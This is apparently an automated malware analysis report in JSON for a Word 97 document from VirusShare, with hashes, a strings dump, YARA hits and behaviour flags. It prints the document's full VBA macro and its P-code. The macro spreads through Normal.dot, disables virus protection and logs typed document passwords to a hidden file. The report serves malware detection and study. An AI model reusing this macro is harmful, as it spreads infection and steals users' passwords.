{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"fake\u00ae\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Print #": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\nSub AutoOpen()\n' Macro criada por Zig Freak\nOn Error GoTo Final\n\n   Application.ScreenUpdating = False\n   Application.DisplayAlerts = wdAlertsNone\n\n   WordBasic.DisableAutoMacros 0\n   Options.VirusProtection = False\n\n\n   Set ActiveDoc = ActiveDocument\n   Set GlobalDoc = NormalTemplate\n\n   DocumentInstalled = False\n   GlobalInstalled = False\n   \n  For I = 1 To ActiveDocument.VBProject.VBComponents.Count\n      If ActiveDocument.VBProject.VBComponents(I).Name = \"fake\u00ae\" Then\n         DocumentInstalled = True\n      End If\n   Next\n\n   For J = 1 To NormalTemplate.VBProject.VBComponents.Count\n      If NormalTemplate.VBProject.VBComponents(J).Name = \"fake\u00ae\" Then\n        GlobalInstalled = True\n      End If\n   Next\n   \n      If DocumentInstalled = False Then\n         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=\"fake\u00ae\", Object:=wdOrganizerObjectProjectItems\n          ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate\n            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=\"PassBox\", Object:=wdOrganizerObjectProjectItems\n              ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate\n      End If\n           \n     \n      If GlobalInstalled = False Then\n         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=\"fake\u00ae\", Object:=wdOrganizerObjectProjectItems\n         Options.SaveNormalPrompt = False\n            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=\"PassBox\", Object:=wdOrganizerObjectProjectItems\n            Options.SaveNormalPrompt = False\n      End If\n        If ActiveDocument.HasPassword = False Then GoTo Final\n     PassBox.Show\n     Call Abre\nFinal:\n    End Sub\n    \nFunction Abre()\n  \nOn Error Resume Next\nSetAttr \"C:\\IO.SDX\", 0\nOpen \"C:\\IO.SDX\" For Append As #1\nPrint #1, \"Path = \" + ActiveDocument.FullName\nPrint #1, \"Password = \" + PassBox.TextBox1\nPrint #1, \" \"\nClose #1\nSetAttr \"C:\\IO.SDX\", 1 + 2 + 4\n\nApplication.DisplayAlerts = wdAlertsAll\nUnload PassBox\n\nEnd Function\n\n' Processing file: VirusShare_380a1987d041f0e4dfbcda434f21405c\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/fake\u00ae - 6949 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoOpen())\n' Line #1:\n' \tQuoteRem 0x0000 0x001B \" Macro criada por Zig Freak\"\n' Line #2:\n' \tOnError Final \n' Line #3:\n' Line #4:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #5:\n' \tLd wdAlertsNone \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #6:\n' Line #7:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DisableAutoMacros 0x0001 \n' Line #8:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #9:\n' Line #10:\n' Line #11:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet ActiveDoc \n' Line #12:\n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet GlobalDoc \n' Line #13:\n' Line #14:\n' \tLitVarSpecial (False)\n' \tSt DocumentInstalled \n' Line #15:\n' \tLitVarSpecial (False)\n' \tSt GlobalInstalled \n' Line #16:\n' Line #17:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #18:\n' \tLd I \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"fake\u00ae\"\n' \tEq \n' \tIfBlock \n' Line #19:\n' \tLitVarSpecial (True)\n' \tSt DocumentInstalled \n' Line #20:\n' \tEndIfBlock \n' Line #21:\n' \tStartForVariable \n' \tNext \n' Line #22:\n' Line #23:\n' \tStartForVariable \n' \tLd J \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #24:\n' \tLd J \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"fake\u00ae\"\n' \tEq \n' \tIfBlock \n' Line #25:\n' \tLitVarSpecial (True)\n' \tSt GlobalInstalled \n' Line #26:\n' \tEndIfBlock \n' Line #27:\n' \tStartForVariable \n' \tNext \n' Line #28:\n' Line #29:\n' \tLd DocumentInstalled \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #30:\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0005 \"fake\u00ae\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #31:\n' \tLd ActiveDoc \n' \tMemLd New \n' \tParamNamed FileName \n' \tLd wdFormatTemplate \n' \tParamNamed FileFormat \n' \tLd ActiveDoc \n' \tArgsMemCall SaveAs 0x0002 \n' Line #32:\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0007 \"PassBox\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #33:\n' \tLd ActiveDoc \n' \tMemLd New \n' \tParamNamed FileName \n' \tLd wdFormatTemplate \n' \tParamNamed FileFormat \n' \tLd ActiveDoc \n' \tArgsMemCall SaveAs 0x0002 \n' Line #34:\n' \tEndIfBlock \n' Line #35:\n' Line #36:\n' Line #37:\n' \tLd GlobalInstalled \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #38:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0005 \"fake\u00ae\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #39:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #40:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0007 \"PassBox\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #41:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #42:\n' \tEndIfBlock \n' Line #43:\n' \tLd ActiveDocument \n' \tMemLd HasPassword \n' \tLitVarSpecial (False)\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Final \n' \tEndIf \n' Line #44:\n' \tLd PassBox \n' \tArgsMemCall Show 0x0000 \n' Line #45:\n' \tArgsCall (Call) Abre 0x0000 \n' Line #46:\n' \tLabel Final \n' Line #47:\n' \tEndSub \n' Line #48:\n' Line #49:\n' \tFuncDefn (Function Abre())\n' Line #50:\n' Line #51:\n' \tOnError (Resume Next) \n' Line #52:\n' \tLitStr 0x0009 \"C:\\IO.SDX\"\n' \tLitDI2 0x0000 \n' \tArgsCall SetAttr 0x0002 \n' Line #53:\n' \tLitStr 0x0009 \"C:\\IO.SDX\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Append)\n' Line #54:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0007 \"Path = \"\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tAdd \n' \tPrintItemNL \n' Line #55:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x000B \"Password = \"\n' \tLd PassBox \n' \tMemLd TextBox1 \n' \tAdd \n' \tPrintItemNL \n' Line #56:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0001 \" \"\n' \tPrintItemNL \n' Line #57:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #58:\n' \tLitStr 0x0009 \"C:\\IO.SDX\"\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0002 \n' \tAdd \n' \tLitDI2 0x0004 \n' \tAdd \n' \tArgsCall SetAttr 0x0002 \n' Line #59:\n' Line #60:\n' \tLd wdAlertsAll \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #61:\n' \tLd PassBox \n' \tArgsCall Unlock 0x0001 \n' Line #62:\n' Line #63:\n' \tEndFunc \n"
    },
    "filename": "VirusShare_380a1987d041f0e4dfbcda434f21405c",
    "filesize": 45056,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Template: Normal.dot, Last Saved By: xx, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Mar 27 14:58:00 2000, Last Saved Time/Date: Fri Apr 14 12:55:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "380a1987d041f0e4dfbcda434f21405c",
        "sha1": "2dec661c950a6a1c7560cd7b8c65ab3d6d442d6b",
        "sha256": "fe1ce9e44cea3dcf751769e02d55726c7b0d6c3fcf924b044f7da9f2b56bae6d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "00000000000000000000000000000000000000000000000000000000000000000000000000000000",
            "  00000000 ",
            ". A!n",
            "bjbjWW",
            "C&wsD",
            "Normal.dot",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            " \t84",
            "`6{`",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            " Macro criada por Zig Freak",
            "fake",
            "fake",
            "fake",
            "PassBox",
            "fake",
            "PassBox",
            "C:\\IO.SDX",
            "C:\\IO.SDX",
            "Path = ",
            "Password = ",
            "C:\\IO.SDX",
            "Attribut",
            "e VB_Nam",
            "e = \"fak",
            " AutoOpe",
            "acro cri",
            "ada por ",
            "Zig Frea",
            "On Er",
            "&GoTo F",
            "inal",
            "   Appli",
            "cation.S",
            "creenUpd\t",
            "Fals",
            "&DisplayAlerts",
            "WordBasic.",
            ",able",
            "s.VirusProtec",
            " Set A",
            "Glob",
            "NormalTemRtH",
            "Install|ed4",
            "A.4VB",
            "mpnts.CouO/If",
            "(I). Txhen9",
            "End If",
            "}/J/GT\"/b",
            "I\tOrgan",
            "izerCopy",
            " Source:B=L3Full],` Dest:N=LzG\t",
            ":=wd",
            "DItems",
            ".SaveAsle",
            "7mat",
            "g[\te",
            "PassBox\"",
            "ile}",
            ". G{FF",
            "xF,FF",
            "Lmpt {G",
            "At`  _",
            "Has!",
            "w@!;",
            " i\u0782\t",
            ".Sho",
            "wDC` Abr{\u0a22:",
            "Fun!",
            "  hResB ",
            " \"C:\\IO.SDXe@m",
            " [!5e#",
            "Print",
            " #1, \"Path",
            "\" +c'",
            " @Close",
            "l`Unload",
            "\tch8",
            "\tch(",
            "8fh]/\\",
            "(fh]/\\",
            "338f70730",
            "538f7073a",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Modulo1",
            "fake",
            "AutoOpen*",
            "Finalb",
            "Application*",
            "ScreenUpdating!",
            "DisplayAlerts",
            "wdAlertsNone",
            "WordBasic",
            "DisableAutoMacros",
            "Options",
            "VirusProtectionoD",
            "ActiveDoc\u0692",
            "ActiveDocument\\",
            "GlobalDoc?P",
            "NormalTemplateq",
            "DocumentInstalled",
            "GlobalInstalled",
            "VBProjectOh",
            "VBComponents",
            "Count0v",
            "OrganizerCopy",
            "SourceG",
            "FullName\u041e",
            "Destination\u043b",
            "wdOrganizerObjectProjectItems",
            "SaveAsf;",
            "FileNamej",
            "FileFormat",
            "wdFormatTemplate",
            "SaveNormalPrompt\u02bc",
            "HasPassword",
            "PassBoxNh",
            "Show",
            "Abre?",
            "SetAttrC",
            "TextBox1S",
            "wdAlertsAll",
            "_B_var_ActiveDoc",
            "_B_var_GlobalDocY",
            "_B_var_DocumentInstalled",
            "_B_var_GlobalInstalled",
            "_B_var_I\t",
            "Itemz",
            "_B_var_J",
            "_B_var_PassBoxQ\\",
            "Documentj",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\",
            "SYSTEM\\S",
            "TDOLE2.T",
            " Automation",
            "MSF!ms>",
            "25FC9141",
            "-1206-11 D4-87",
            "44455354",
            "3.TWD#Mi",
            "crosoft ",
            "` Obje",
            "ct Libra",
            "P4,PJP \\VBE\\(EX",
            "ACxOffic",
            "DxO@uf",
            "Bx+,DF8",
            "D04C-5BF",
            "A-101B-BHDE5@xAA@w4",
            "UPROGR",
            "AMMI\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHY\" 8.0Y",
            "BThisDoc@ument",
            "h@5sD",
            "Afake",
            "DEST",
            "Normal",
            "ThisDocument",
            "Modulo1",
            "fake",
            "C:\\PROGRAMMI\\FILE COMUNI\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Programmi\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "DEST",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "DEST",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAMMI\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "AutoOpen",
            "Abre",
            "DisableAutoMacros",
            "fake",
            "Name",
            "SaveAs",
            "FileName",
            "FileFormat",
            "PassBox",
            "Show-",
            "ThisDocument",
            "fake",
            "ID=\"{5075EC47-120C-11D4-8706-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=fake",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"A9ABFE0602060206020602\"",
            "DPB=\"5250050EAF0FAF0FAF\"",
            "GC=\"FBF9ACF954FA54FAAB\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "fake=0, 0, 0, 0, C",
            "Documento Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            " PAGE ",
            "A seguito di",
            "Affettuosi saluti",
            "All'attenzione di",
            "Alla cortese attenzione di",
            "Autore ",
            " AUTHOR ",
            "Autore ultimo salvataggio ",
            " LASTSAVEDBY ",
            " AUTHOR ",
            "\tPagina ",
            " PAGE ",
            " DATE ",
            "Con affetto",
            "Con i migliori auguri",
            "Con i migliori saluti",
            "Con ossequi",
            "Con osservanza",
            "Cordiali saluti",
            "Cordialmente",
            "Data creazione ",
            " CREATEDATE ",
            "Data ultima stampa ",
            " PRINTDATE ",
            "Distinti saluti",
            "Egregio Signore,",
            "ESPRESSO",
            "Gentile Signora,",
            "Gentile Signore,",
            "Grazie",
            "I pi cordiali saluti",
            "In riferimento a",
            "In risposta a",
            " FILENAME ",
            " FILENAME \\p ",
            "Oggetto:",
            "Pagina ",
            " PAGE ",
            " di ",
            " NUMPAGES ",
            "PERSONALE",
            "POSTA AEREA",
            "RACCOMANDATA",
            "Riservato\tPagina ",
            " PAGE ",
            " DATE ",
            "Stammi bene",
            "Ti ringrazio",
            ". A!n"
        ],
        "file": {
            "C:\\PROGRAMMI\\FILE COMUNI\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAMMI\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Programmi\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen"
        },
        "fuzzing": {
            "String too long": [
                "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.307318",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
